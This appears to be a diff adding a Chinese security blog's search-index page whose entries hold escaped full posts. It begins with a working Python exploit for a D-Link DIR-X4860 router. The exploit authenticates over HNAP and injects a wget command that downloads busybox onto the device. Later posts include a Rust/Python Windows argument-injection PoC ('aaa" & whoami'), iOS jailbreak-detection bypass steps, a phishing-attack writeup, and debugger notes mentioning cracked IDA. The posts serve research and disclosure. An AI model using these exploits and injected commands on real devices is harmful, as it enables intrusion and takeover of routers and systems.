+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;def login_request(ip, port, https):
+    &amp;quot;&amp;quot;&amp;quot;login_result&amp;quot;&amp;quot;&amp;quot;
+    xml_post = &amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+    &amp;lt;soap:Body&amp;gt;
+        &amp;lt;Login xmlns=&amp;quot;http://purenetworks.com/HNAP1/&amp;quot;&amp;gt;
+            &amp;lt;Action&amp;gt;request&amp;lt;/Action&amp;gt;
+            &amp;lt;Username&amp;gt;Admin&amp;lt;/Username&amp;gt;
+            &amp;lt;PrivateLogin&amp;gt;Username&amp;lt;/PrivateLogin&amp;gt;
+            &amp;lt;login_password&amp;gt;&amp;lt;/login_password&amp;gt;
+            &amp;lt;Captcha&amp;gt;&amp;lt;/Captcha&amp;gt;
+        &amp;lt;/Login&amp;gt;
+    &amp;lt;/soap:Body&amp;gt;
+&amp;lt;/soap:Envelope&amp;gt;&amp;quot;&amp;quot;&amp;quot;
+    headers = {
+        &amp;quot;Host&amp;quot;: ip,
+        &amp;quot;X-Requested-With&amp;quot;: &amp;quot;XMLHttpRequest&amp;quot;,
+        &amp;quot;SOAPAction&amp;quot;: &#39;&amp;quot;http://purenetworks.com/HNAP1/Login&amp;quot;&#39;,
+        &amp;quot;Content-Type&amp;quot;: &amp;quot;text/xml; charset=UTF-8&amp;quot;,
+    }
+    challenge, cookie, public_key, _ = send_http(ip, port, https, headers, xml_post)
+    if challenge == b&amp;quot;&amp;quot;:
+        print(&amp;quot;[-] get Challenge error&amp;quot;)
+        sys.exit(0)
+    return challenge, cookie, public_key
+
+def login_login(ip, port, https, login_password, hnap_auth, time_now, cookie):
+    &amp;quot;&amp;quot;&amp;quot;login_login&amp;quot;&amp;quot;&amp;quot;
+    xml_post = f&amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+    &amp;lt;soap:Body&amp;gt;
+        &amp;lt;Login xmlns=&amp;quot;http://purenetworks.com/HNAP1/&amp;quot;&amp;gt;
+            &amp;lt;Action&amp;gt;login&amp;lt;/Action&amp;gt;
+            &amp;lt;Username&amp;gt;Admin&amp;lt;/Username&amp;gt;
+            &amp;lt;LoginPassword&amp;gt;{login_password}&amp;lt;/LoginPassword&amp;gt;
+            &amp;lt;Captcha&amp;gt;&amp;lt;/Captcha&amp;gt;
+        &amp;lt;/Login&amp;gt;
+    &amp;lt;/soap:Body&amp;gt;
+&amp;lt;/soap:Envelope&amp;gt;&amp;quot;&amp;quot;&amp;quot;
+    headers = {
+        &amp;quot;Host&amp;quot;: ip,
+        &amp;quot;X-Requested-With&amp;quot;: &amp;quot;XMLHttpRequest&amp;quot;,
+        &amp;quot;HNAP_AUTH&amp;quot;: f&amp;quot;{hnap_auth} {time_now}&amp;quot;,
+        &amp;quot;SOAPAction&amp;quot;: &#39;&amp;quot;http://purenetworks.com/HNAP1/Login&amp;quot;&#39;,
+        &amp;quot;Content-Type&amp;quot;: &amp;quot;text/xml; charset=UTF-8&amp;quot;,
+        &amp;quot;Cookie&amp;quot;: f&amp;quot;uid={cookie}&amp;quot;,
+    }
+    send_http(ip, port, https, headers, xml_post)
+def set_virtual_server_settings(ip, port, https, hnap_auth, time_now, cookie, cmd):
+    &amp;quot;&amp;quot;&amp;quot;set_virtual_server_settings&amp;quot;&amp;quot;&amp;quot;
+    xml_post = f&amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
+&amp;lt;soap:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soap=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
+    &amp;lt;soap:Body&amp;gt;
+        &amp;lt;SetVirtualServerSettings xmlns=&amp;quot;http://purenetworks.com/HNAP1/&amp;quot;&amp;gt;
+            &amp;lt;VirtualServerList&amp;gt;
+                &amp;lt;VirtualServerInfo&amp;gt;
+                    &amp;lt;Enabled&amp;gt;true&amp;lt;/Enabled&amp;gt;
+                    &amp;lt;VirtualServerDescription&amp;gt;false&amp;lt;/VirtualServerDescription&amp;gt;
+                    &amp;lt;ExternalPort&amp;gt;false&amp;lt;/ExternalPort&amp;gt;
+                    &amp;lt;InternalPort&amp;gt;9&amp;lt;/InternalPort&amp;gt;
+                    &amp;lt;ProtocolType&amp;gt;UDP&amp;lt;/ProtocolType&amp;gt;
+                    &amp;lt;ProtocolNumber&amp;gt;UDP&amp;lt;/ProtocolNumber&amp;gt;
+                    &amp;lt;LocalIPAddress&amp;gt;{cmd}&amp;lt;/LocalIPAddress&amp;gt;//将IP替换成注入命令
+                    &amp;lt;ScheduleName&amp;gt;false&amp;lt;/ScheduleName&amp;gt;
+                &amp;lt;/VirtualServerInfo&amp;gt;
+                &amp;lt;VirtualServerInfo:0&amp;gt;
+                    &amp;lt;Enabled&amp;gt;true&amp;lt;/Enabled&amp;gt;
+                    &amp;lt;VirtualServerDescription&amp;gt;false&amp;lt;/VirtualServerDescription&amp;gt;
+                    &amp;lt;ExternalPort&amp;gt;false&amp;lt;/ExternalPort&amp;gt;
+                    &amp;lt;InternalPort&amp;gt;9&amp;lt;/InternalPort&amp;gt;
+                    &amp;lt;ProtocolType&amp;gt;UDP&amp;lt;/ProtocolType&amp;gt;
+                    &amp;lt;ProtocolNumber&amp;gt;UDP&amp;lt;/ProtocolNumber&amp;gt;
+                    &amp;lt;LocalIPAddress&amp;gt;{cmd}&amp;lt;/LocalIPAddress&amp;gt;
+                    &amp;lt;ScheduleName&amp;gt;false&amp;lt;/ScheduleName&amp;gt;
+                &amp;lt;/VirtualServerInfo:0&amp;gt;
+                &amp;lt;VirtualServerInfo:1&amp;gt;
+                    &amp;lt;Enabled&amp;gt;true&amp;lt;/Enabled&amp;gt;
+                    &amp;lt;VirtualServerDescription&amp;gt;false&amp;lt;/VirtualServerDescription&amp;gt;
+                    &amp;lt;ExternalPort&amp;gt;false&amp;lt;/ExternalPort&amp;gt;
+                    &amp;lt;InternalPort&amp;gt;9&amp;lt;/InternalPort&amp;gt;
+                    &amp;lt;ProtocolType&amp;gt;UDP&amp;lt;/ProtocolType&amp;gt;
+                    &amp;lt;ProtocolNumber&amp;gt;UDP&amp;lt;/ProtocolNumber&amp;gt;
+                    &amp;lt;LocalIPAddress&amp;gt;{cmd}&amp;lt;/LocalIPAddress&amp;gt;
+                    &amp;lt;ScheduleName&amp;gt;false&amp;lt;/ScheduleName&amp;gt;
+                &amp;lt;/VirtualServerInfo:1&amp;gt;
+            &amp;lt;/VirtualServerList&amp;gt;
+        &amp;lt;/SetVirtualServerSettings&amp;gt;
+    &amp;lt;/soap:Body&amp;gt;
+&amp;lt;/soap:Envelope&amp;gt;&amp;quot;&amp;quot;&amp;quot;
+    headers = {
+        &amp;quot;Host&amp;quot;: ip,
+        &amp;quot;X-Requested-With&amp;quot;: &amp;quot;XMLHttpRequest&amp;quot;,
+        &amp;quot;HNAP_AUTH&amp;quot;: f&amp;quot;{hnap_auth} {time_now}&amp;quot;,
+        &amp;quot;SOAPAction&amp;quot;: &#39;&amp;quot;http://purenetworks.com/HNAP1/SetVirtualServerSettings&amp;quot;&#39;,
+        &amp;quot;Content-Type&amp;quot;: &amp;quot;text/xml; charset=UTF-8&amp;quot;,
+        &amp;quot;Cookie&amp;quot;: f&amp;quot;uid={cookie}&amp;quot;,
+    }
+    send_http(ip, port, https, headers, xml_post)
+def exploit():
+  dummy_password = &amp;quot;Admin&amp;quot;
+  private_key = get_hmac_key_md5(public_key + dummy_password, challenge)
+  login_password = get_hmac_key_md5(private_key, challenge)
+  print(f&amp;quot;[+] login_password : {login_password}&amp;quot;)
+  soap_namespace2 = &amp;quot;http://purenetworks.com/HNAP1/&amp;quot;
+  action = &amp;quot;Login&amp;quot;
+  soap_action = f&#39;&amp;quot;{soap_namespace2}{action}&amp;quot;&#39;
+  print(f&amp;quot;[+] SOAPAction : {soap_action}&amp;quot;)
+  time_now = int(round(time.time() * 1000))
+  time_now = math.floor(time_now) % 2000000000000
+  time_now = &amp;quot;%d&amp;quot; % time_now
+  print(f&amp;quot;[+] Time : {time_now}&amp;quot;)
+  hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
+  print(f&amp;quot;[+] HNAP_AUTH : {hnap_auth}&amp;quot;)
+  login_login(
+      target_ip, target_port, target_https, login_password, hnap_auth, time_now, cookie
+  )
+    
+  cmd = &amp;quot;1;wget http://192.168.0.100:8000/busybox -O /tmp/tel;AAAAAAAAAAA&amp;quot;
+  set_virtual_server_settings(
+      target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
+  )
+&lt;/code&gt;&lt;/pre&gt;
+">DIR-X4860_D-link路由器0day漏洞</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/cve-2024-0333-chrome-extension/"" data-c="
+          &lt;h1 id=&#34;cve-2024-0333-chrome-extension&#34;&gt;CVE-2024-0333 Chrome extension&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Chromium在检查浏览器组建文件时，由于ZIP32位和ZIP64位的遗留问题，在EOF符号处产生歧义和逻辑错误（可能是为了效率），输入验证不足，导致可以对64KB大小以下的扩展程序和浏览器组件进行注入和提权&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;**CVSS等级：**5.3&lt;/p&gt;
+&lt;p&gt;**受影响应用：**Google chrome &amp;lt;= 120.0.6099.216&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞影响面：&lt;/strong&gt; 很小，在Chrome插件市场和Chrome自身组件中没有，仅可能对企业自定义插件有影响&lt;/p&gt;
+&lt;h4 id=&#34;漏洞介绍&#34;&gt;漏洞介绍&lt;/h4&gt;
+&lt;hr&gt;
+&lt;p&gt;Chromium所有扩展和大多数浏览器组件更新都使用 CRX 文件格式，它实际上是一个&lt;a href=&#34;https://en.wikipedia.org/wiki/ZIP_(file_format)&#34;&gt;ZIP 文件&lt;/a&gt;，前面带有包含签名和其他元数据的标头，以保证文件完整性。&lt;/p&gt;
+&lt;p&gt;&lt;u&gt;Google Chrome Elevation Service&lt;/u&gt;可以获取低特权的可执行文件并以较高的特权运行它，可以用于安装某些更新。其通过下列过程来防止被篡改：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将用户指定的CRX文件复制到受信任的位置（低权限用户无权将任何其他文件注入受信任位置）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;对文件执行签名验证&lt;/strong&gt;（任何篡改压缩可执行文件的尝试都会使签名无效并阻止其运行）&lt;/li&gt;
+&lt;li&gt;解压缩&lt;/li&gt;
+&lt;li&gt;运行提取的可执行文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;**绕过签名验证是可能的：**CRX文件格式存在着向文件头（header）注入额外数据的可能性，且文件头本身包含的大部分数据无需经过验证。ZIP由于年代久远有ZIP32和ZIP64（大于4GB）两种格式，分别对应不同的EOF符号&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AegeanYan/ImageBed/main/CVE-2024-0333.jpeg&#34; alt=&#34;CVE-2024-0333&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;u&gt;Chrome使用Minizip库来解压缩CRX（实际上是ZIP格式），寻找EOCD时，函数会从文件末尾向前查找&lt;strong&gt;64kB&lt;/strong&gt;，Minizip会先尝试查找EOCD64，再查找EOCD（32），这就为注入带来了可能&lt;/u&gt;&lt;/p&gt;
+&lt;p&gt;但这也使得该方法只能处理64kB大小以下（EOCD）的扩展程序，但插件应用市场中最小的是73kB。。。。&lt;/p&gt;
+&lt;p&gt;Google允许公司自行定义企业级插件，这些插件可以从公司内部服务器自动安装和更新。在这些场景中，可能还存在64kB以下的扩展程序😂&lt;/p&gt;
+">Chrome extension CRX文件格式解压问题</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/rustpython-deng-bian-cheng-yu-yan-dui-win-xia-cmd-jin-xing-yue-quan/"" data-c="
+          &lt;h1 id=&#34;cve-2024-24576-windows-rust&#34;&gt;CVE-2024-24576 Windows Rust&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The Rust Security Response WG was notified that the Rust standard library did not properly escape arguments when invoking batch files (with the &lt;code&gt;bat&lt;/code&gt; and &lt;code&gt;cmd&lt;/code&gt; extensions) on Windows using the &lt;a href=&#34;https://doc.rust-lang.org/std/process/struct.Command.html&#34;&gt;&lt;code&gt;Command&lt;/code&gt;&lt;/a&gt; API. An attacker able to control the arguments passed to the spawned process could execute arbitrary shell commands by bypassing the escaping.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Rust 编程语言背后的项目声称，对特定 API 的任何调用都是安全的，即使输入的是不安全的内容，但研究人员找到了绕过保护的方法。利用该漏洞可以在windows cmd中注入恶意代码。&lt;/p&gt;
+&lt;p&gt;**受影响的 Rust 版本：**Rust for Windows &amp;lt; 1.77.2&lt;/p&gt;
+&lt;p&gt;**CVSS等级：**10.0&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞影响面：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;这个漏洞只存在于 Windows 系统，但不仅仅影响 Rust 语言，像 PHP、Python、Node.js 等均受影响，具体可以参考如下页面：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;CERT/CC: &lt;a href=&#34;https://www.kb.cert.org/vuls/id/123335&#34;&gt;Multiple programming languages fail to escape arguments properly in Microsoft Windows&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Flatt Security Inc./RyotaK: &lt;a href=&#34;https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/&#34;&gt;BatBadBut: You can’t securely execute commands on Windows&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;poc&#34;&gt;PoC&lt;/h4&gt;
+&lt;h6 id=&#34;testbat&#34;&gt;test.bat&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bat&#34;&gt;@echo off
+echo Argument received: %1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6 id=&#34;testrs&#34;&gt;test.rs&lt;/h6&gt;
+&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;use std::io::{self, Write};
+use std::process::Command;
+
+fn main() {
+    println!(&amp;quot;enter payload here&amp;quot;);
+    let mut input = String::new();
+    io::stdout().flush().expect(&amp;quot;Failed to flush stdout&amp;quot;);
+    io::stdin().read_line(&amp;amp;mut input).expect(&amp;quot;Failed to read from stdin&amp;quot;);
+    let output = Command::new(&amp;quot;./test.bat&amp;quot;)
+                    .arg(input.trim())
+                    .output()
+                    .expect(&amp;quot;Failed to execute command&amp;quot;);
+    println!(&amp;quot;Output:\n{}&amp;quot;, String::from_utf8_lossy(&amp;amp;output.stdout));
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6 id=&#34;测试&#34;&gt;测试&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;D:\&amp;gt;rustc test.rs
+
+D:\&amp;gt;test.exe
+enter payload here
+aaa
+Output:
+Argument received: aaa
+
+D:\&amp;gt;test.exe
+enter payload here
+aaa &amp;amp; whoami
+Output:
+Argument received: &amp;quot;aaa &amp;amp; whoami&amp;quot;
+
+D:\&amp;gt;test.exe
+enter payload here
+aaa&amp;quot; &amp;amp; whoami
+Output:
+Argument received: &amp;quot;aaa\&amp;quot;
+desktop-618ia48\ddw
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h6 id=&#34;错误逻辑与修复&#34;&gt;错误逻辑与修复&lt;/h6&gt;
+&lt;p&gt;漏洞版本会把样例包装成&lt;code&gt;cmd.exe /d /c &amp;quot;&amp;quot;D:\test.bat&amp;quot; &amp;quot;aaa\&amp;quot; &amp;amp; whoami&amp;quot;&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;修复版本会把样例包装成&lt;code&gt;cmd.exe /e:ON /v:OFF /d /c &amp;quot;&amp;quot;D:\test.bat&amp;quot; &amp;quot;aaa&amp;quot;&amp;quot; &amp;amp; whoami&amp;quot;&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&#34;python样例&#34;&gt;Python样例&lt;/h6&gt;
+&lt;pre&gt;&lt;code&gt;D:\&amp;gt;python3
+Python 3.11.6 (tags/v3.11.6:8b6ee5b, Oct  2 2023, 14:57:12) [MSC v.1935 64 bit (AMD64)] on win32
+Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; import subprocess
+&amp;gt;&amp;gt;&amp;gt; subprocess.Popen([&#39;test.bat&#39;, &#39;aaa&amp;quot; &amp;amp; whoami&#39;])
+&amp;lt;Popen: returncode: None args: [&#39;test.bat&#39;, &#39;aaa&amp;quot; &amp;amp; whoami&#39;]&amp;gt;
+&amp;gt;&amp;gt;&amp;gt; Argument received: &amp;quot;aaa\&amp;quot;
+desktop-618ia48\ddw
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h5 id=&#34;总结&#34;&gt;总结&lt;/h5&gt;
+&lt;p&gt;在Windows下以Rust、Python及一些语言调用cmd时，运行.bat, .cmd等都会因为转义逻辑出错而产生预料外行为。该漏洞跟内存安全没有关系，是 Windows 下 &lt;code&gt;cmd.exe&lt;/code&gt; 对命令行参数的特殊解析逻辑所导致的逻辑漏洞。&lt;/p&gt;
+&lt;h5 id=&#34;参考文档&#34;&gt;参考文档&lt;/h5&gt;
+&lt;ol&gt;
+&lt;li&gt;https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/&lt;/li&gt;
+&lt;li&gt;https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html&lt;/li&gt;
+&lt;li&gt;https://www.kb.cert.org/vuls/id/123335&lt;/li&gt;
+&lt;li&gt;https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main&lt;/li&gt;
+&lt;li&gt;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw&lt;/li&gt;
+&lt;li&gt;https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way&lt;/li&gt;
+&lt;li&gt;https://persistence-info.github.io/Data/cmdautorun.html&lt;/li&gt;
+&lt;li&gt;https://programlife.net/2024/04/14/cve-2024-24576-rust-command-injection-vulnerability/&lt;/li&gt;
+&lt;/ol&gt;
+">Rust\Python等编程语言对Win下CMD进行越权</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/ji-lu-ji-chong-yue-yu-jian-ce-rao-guo/"" data-c="
+          &lt;p&gt;这两天需要hook几款app，几乎每款都有越狱检测，故记录一下几种已经使用过的绕过方法。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;修改frida-server二进制文件名，绕过简单的文件名检测。爱思助手或者mv均可&lt;/li&gt;
+&lt;li&gt;修改frida监听端口，默认检测27042。
+&lt;ul&gt;
+&lt;li&gt;./frida -l 0.0.0.0:41032&lt;/li&gt;
+&lt;li&gt;iproxy 41032 41032&lt;/li&gt;
+&lt;li&gt;objection -N -h &lt;strong&gt;localhost&lt;/strong&gt; -p 3333 -g &lt;code&gt;bundle_id&lt;/code&gt; explore 这里的localhost换成127.0.0.1或0.0.0.0都会无法连接，不知道为啥。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;添加Shadow的Cydia源，并安装Shadow，运行Shadow来遮蔽越狱。Shadow开启动态库会使objection无法连接&lt;/li&gt;
+&lt;/ul&gt;
+">记录几种越狱检测绕过</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/apple-id-wang-luo-diao-yu-gong-ji-tong-guo-chong-she-mi-ma-qing-qiu/"" data-c="
+          &lt;p&gt;2024年3月24日，X用户汇报受到了新型的网络钓鱼攻击，主要原因来自于Apple对于&lt;a href=&#34;https://iforgot.apple.com/&#34;&gt;重设密码&lt;/a&gt;请求的低限制。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AegeanYan/ImageBed/main/Apple_reset_attack.jpeg&#34; style=&#34;zoom:10%;&#34; /&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AegeanYan/ImageBed/main/Apple_reset_attack_1.jpeg&#34; style=&#34;zoom:10%;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;攻击者只需要受害者的Apple ID和电话号码就可以发出数以百计的Reset请求到受害者的所有apple设备，必须全部点击后才能正常使用设备，该攻击会影响用户正常使用（比如夜间进行大批量的请求），个人测试只需要全部点击Don&#39;t Allow，在一段时间内就不会收到新的请求。&lt;/p&gt;
+&lt;p&gt;此外攻击者还会假扮Apple公司的客服号码1-800-275-2273，告诉受害者其账号正受到攻击，需要提供OTP。而OTP很可能被攻击者用于重设Apple ID。OTP修改密码并不会快速完成，Apple会对受害者进行提醒并审核约一周。所以我觉得实际能钓到鱼的难度很大。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/parth220_/status/1771589789143478471?s=61&#34;&gt;参考1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.macworld.com/article/2280669/apple-id-push-bombing-attack-reset-password-notification.html?utm_source=danielmiessler.com&amp;amp;utm_medium=referral&amp;amp;utm_campaign=ul-no-426-unveiling-xz-ai-monitoring-investigative-visualizations-with-fabric&#34;&gt;参考2&lt;/a&gt;&lt;/p&gt;
+">Apple ID网络钓鱼攻击——通过重设密码请求</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/idevice-de-usb-lian-jie/"" data-c="
+          &lt;p&gt;简单介绍一下如何用USB连接取代简单的网络连接&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;p&gt;一般我们ssh连接iDevice的时候使用的是&lt;code&gt;ssh root@ip&lt;/code&gt;，但看到有人建议使用usb连接。在mac上我使用&lt;code&gt;usbmuxd&lt;/code&gt;来完成&lt;a href=&#34;https://iphonedev.wiki/SSH_Over_USB&#34;&gt;参考&lt;/a&gt;。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;brew install libusbmuxd
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用brew下载&lt;code&gt;libusbmuxd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;再将&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Host my-iphone
+    ProxyCommand inetcat 22 &amp;lt;my-phone-uuid&amp;gt;
+    User root
+    StrictHostKeyChecking no
+    UserKnownHostsFile /dev/null
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;写入&lt;code&gt;~/.ssh/config&lt;/code&gt;文件，就可以简单的&lt;code&gt;ssh my-iphone&lt;/code&gt;进行ssh连接啦。&lt;/p&gt;
+&lt;p&gt;其次，&lt;code&gt;usbmuxd&lt;/code&gt; 中还有&lt;code&gt;iproxy&lt;/code&gt;工具，可以帮助我们打通主机和usb设备端口。&lt;/p&gt;
+&lt;p&gt;比如在IDA pro debugger中，我们一般用命令&lt;code&gt;debugserver 主机host:port0 --attach=&amp;lt;process_name&amp;gt;&lt;/code&gt; 和 IDA中 &lt;code&gt;iDevicehost:port0&lt;/code&gt; 来进行远程调试。而利用&lt;code&gt;iproxy&lt;/code&gt;我们可以通过端口映射来打通设备。&lt;/p&gt;
+&lt;p&gt;先在主机上运行进程&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;iproxy port1 port2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;之后iDevice上的debugserver命令可以是&lt;code&gt;debugserver localhost:port1 --attach=&amp;lt;process_name&amp;gt;&lt;/code&gt; , IDA设置为&lt;code&gt;localhost:port2&lt;/code&gt;由此来进行USB连接，提升网络性能。&lt;/p&gt;
+">iDevice的usb连接</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://AegeanYan.github.io/post/ida-pro-debugger-chu-chang-bi-keng-zhi-nan/"" data-c="
+          &lt;p&gt;萌新想要调试自己手上的一个简单项目，但在使用自己的IDA pro 7.0 cracked 版本 按教程启动debugger时出现了 &lt;code&gt;Invalid service&lt;/code&gt; 的问题，最初我以为是自己的IDA pro版本过低的问题。从Hex-rays&lt;a href=&#34;https://hex-rays.com//wp-content/uploads/2020/06/ios_debugger_primer2.pdf&#34;&gt;官方教程&lt;/a&gt;中发现自己的 &lt;code&gt;Device&lt;/code&gt;栏没有自动识别。于是去PYG找到了8.3版本的window版IDA pro并用crossover与自己的intel mac打通debugger成功。发现网络上的教程或太老或不全，考虑到自己的探索可能是互联网上头一份，故记录一下。&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;p&gt;首先已经验证的是报错&lt;code&gt;Error launching iOS debugserver: The service is invalid. (errcode = 0xe8000022)&lt;/code&gt;和IDA pro版本没有直接关系，和win/mac的IDA pro版本存在一定关系。在IDA pro任务栏 debugger-&amp;gt;Debugger options-&amp;gt;Set specific options中可以选择&lt;code&gt;Lauch debugserver automatically&lt;/code&gt;项，推测这是IDA利用Xcode做的自动识别与启动iDevice上的debugserver（windows版本是没有这项的）。然而这里存在两个问题：Hex-rays官方教程里使用的是未越狱版本的iDevice，且iOS_deploy.zip这个工具已难找到绿色资源（痛失一块大洋从旮旯里买了一份）。未越狱版本的debugserver有两个问题：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Xcode自动安装的debugserver为只读，在越狱版中可以重签名放回（已尝试&lt;a href=&#34;https://book.crifan.org/books/ios_re_debug_debugserver_lldb/website/debugserver_lldb_debug/proper_entitlemets.html&#34;&gt;debugserver codesign&lt;/a&gt;），（这里面我遇到个坑，为后人避雷了：Xcode自动安装debugserver时虽然我的Xcode版本足够新，有DeviceSupport/&amp;lt;version&amp;gt;/DeveloperDiskImage.dmg 资源，但Xcode于任务栏Windows-&amp;gt;Devices and Simulators首次连接设备时报错Failed to prepare the device for development，且debugserver未安装成功，而我自己的未越狱手机连接正常，&lt;a href=&#34;https://stackoverflow.com/q/64974291&#34;&gt;stackoverflow&lt;/a&gt;上提到一嘴JB的问题给了我思路，我的解决方法是重启非完美越狱的设备回到Jailed状态即可正常连接Xcode，后续即使再次越狱也能正常连接了，虽然JB版本的debugserver完全没必要从这里安装，但不知道Xcode这里的报错会不会带来后续影响）&lt;/li&gt;
+&lt;li&gt;在我的越狱版本中可以直接在Cydia中下载安装debugserver-10来完美替代。功能应该没有区别，并且无论哪种debugserver，最后我在使用&lt;code&gt;Lauch debugserver automatically&lt;/code&gt; 都失败了，但手动启动却都能成功debug。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;总而言之这个错误的来源是mac版的IDA pro上才有的&lt;code&gt;Lauch debugserver automatically&lt;/code&gt;项，将其关闭后手动配置host:port，并手动启动任何一种debugserver即能正常运行。&lt;/p&gt;
+&lt;p&gt;其次分享一下自己利用Crossover打通win版IDA pro debugger的经验。由于自己最早的怀疑是IDA pro版本问题，从P.Y.G搞到了几乎是最新版的IDA pro 8.3，但是好像只有win版，受社区启发利用Crossover试试。Crossover资源自行寻找。Crossover实际做了一个简化版本的win虚拟机，简单讲一下安装上的一点问题，参考&lt;a href=&#34;https://bbs.kanxue.com/thread-278679.htm&#34;&gt;飘雪&lt;/a&gt;。我们保持Python版本和P.Y.G的安装包一致，不下载embeded版本（因为需要Script/pip来进行包管理和下载），而是利用运行命令&lt;code&gt;cmd&lt;/code&gt;来用exe安装Python，设置中将路径放到了IDA pro文件夹里。这里说几个需要注意的地方：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;安装目录随意，出错点跳过这一步就行&lt;/li&gt;
+&lt;li&gt;运行命令&lt;code&gt;regedit&lt;/code&gt;打开注册表，（猜测这个和Win+R效果一样的）填写环境变量HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment中的PATH项，同时放入python文件夹路径和&amp;lt;python&amp;gt;/Script路径，来保证python和pip都对整体环境可见&lt;/li&gt;
+&lt;li&gt;在注册表中继续填写HKEY_USERS\S-1-5-21-0-0-0-1000\Software\Hex-Rays\IDA\Python3TargetDLL，若未见Python3TargetDLL项则新增 字符串值 , 名字是 Python3TargetDLL, 值是 ida目录下 python3.dll 的目录&lt;/li&gt;
+&lt;li&gt;注意我们在实际在操作win虚拟机，各种路径需要从win的角度来看（分盘、反斜杠）&lt;/li&gt;
